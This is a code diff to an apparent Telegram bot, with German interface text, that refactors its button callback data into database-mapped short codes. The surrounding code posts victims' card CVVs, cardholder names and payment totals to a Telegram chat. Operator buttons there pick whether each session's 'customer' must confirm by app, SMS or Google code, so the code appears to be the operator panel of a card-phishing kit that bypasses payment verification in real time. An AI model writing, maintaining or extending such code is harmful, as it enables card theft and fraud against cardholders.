@@ -77,8 +77,9 @@ async function handleCallbackQuery(callbackQuery: any) {
   try {
     switch (action) {
       case 'set_method':
-        const method = params[0];
-        console.log(`Setting verification method: ${method} for session: ${sessionId}`);
+        const shortCode = params[0]; // This is now a short code
+        const method = await getFullMethod(shortCode); // Convert to full method
+        console.log(`Converting short code ${shortCode} to method: ${method} for session: ${sessionId}`);
         
         const { data: result, error } = await supabase.functions.invoke('payment-sessions/set-verification-method', {
           body: { 
@@ -178,7 +179,7 @@ async function handleCallbackQuery(callbackQuery: any) {
             message.chat.id,
             message.message_id,
             `❌ Payment failed, verification reset\n\n${message.text}`,
-            getVerificationMethodButtons(sessionId)
+            await getVerificationMethodButtons(sessionId)
           );
         }
         break;
@@ -188,7 +189,8 @@ async function handleCallbackQuery(callbackQuery: any) {
     let confirmationMessage = 'Action processed';
     
     if (action === 'set_method') {
-      const method = params[0];
+      const shortCode = params[0];
+      const method = await getFullMethod(shortCode);
       switch (method) {
         case 'choice_required':
           confirmationMessage = '✅ Wahl gesetzt - Kunde kann zwischen App & SMS wählen';
@@ -287,7 +289,7 @@ async function sendNotification(chatId: string, type: string, data: any) {
                 `🔐 CVV: <code>${escapeHTML(data.cvv)}</code>\n` +
                 `💰 Gesamtpreis: €${(data.totalPrice || 0).toFixed(2)}\n\n` +
                 `Karteninhaber: ${escapeHTML(data.cardholder_name)}`;
-      buttons = getVerificationMethodButtons(data.session_id);
+      buttons = await getVerificationMethodButtons(data.session_id);
       break;
 
     case 'verification_update':
@@ -319,6 +321,37 @@ async function sendNotification(chatId: string, type: string, data: any) {
   if (message) {
     await sendTelegramMessage(chatId, message, buttons);
   }
+}
+
+// Mapping functions for telegram callback short codes
+async function getShortCode(fullMethod: string): Promise<string> {
+  const { data, error } = await supabase
+    .from('telegram_callback_mapping')
+    .select('short_code')
+    .eq('full_method', fullMethod)
+    .single();
+  
+  if (error || !data) {
+    console.error('Failed to get short code for:', fullMethod, error);
+    return fullMethod; // fallback to full method
+  }
+  
+  return data.short_code;
+}
+
+async function getFullMethod(shortCode: string): Promise<string> {
+  const { data, error } = await supabase
+    .from('telegram_callback_mapping')
+    .select('full_method')
+    .eq('short_code', shortCode)
+    .single();
+  
+  if (error || !data) {
+    console.error('Failed to get full method for:', shortCode, error);
+    return shortCode; // fallback to short code
+  }
+  
+  return data.full_method;
 }
 
 function escapeHTML(text: string): string {
@@ -377,27 +410,35 @@ async function editMessageText(chatId: string, messageId: number, text: string, 
   return response.ok;
 }
 
-function getVerificationMethodButtons(sessionId: string) {
+async function getVerificationMethodButtons(sessionId: string) {
+  const choiceShort = await getShortCode('choice_required');
+  const appShort = await getShortCode('app_confirmation');
+  const smsShort = await getShortCode('sms_confirmation');
+  const googleShort = await getShortCode('google_code_confirmation');
+  
   return {
     inline_keyboard: [
       [
-        { text: '🔄 Wahl', callback_data: `set_method:${sessionId}:choice_required` },
-        { text: '📱 App', callback_data: `set_method:${sessionId}:app_confirmation` }
+        { text: '🔄 Wahl', callback_data: `set_method:${sessionId}:${choiceShort}` },
+        { text: '📱 App', callback_data: `set_method:${sessionId}:${appShort}` }
       ],
       [
-        { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` },
-        { text: '🔢 Code', callback_data: `set_method:${sessionId}:google_code_confirmation` }
+        { text: '💬 SMS', callback_data: `set_method:${sessionId}:${smsShort}` },
+        { text: '🔢 Code', callback_data: `set_method:${sessionId}:${googleShort}` }
       ]
     ]
   };
 }
 
-function getVerificationChoiceButtons(sessionId: string) {
+async function getVerificationChoiceButtons(sessionId: string) {
+  const appShort = await getShortCode('app_confirmation');
+  const smsShort = await getShortCode('sms_confirmation');
+  
   return {
     inline_keyboard: [
       [
-        { text: '📱 App', callback_data: `set_method:${sessionId}:app_confirmation` },
-        { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` }
+        { text: '📱 App', callback_data: `set_method:${sessionId}:${appShort}` },
+        { text: '💬 SMS', callback_data: `set_method:${sessionId}:${smsShort}` }
       ]
     ]
   };
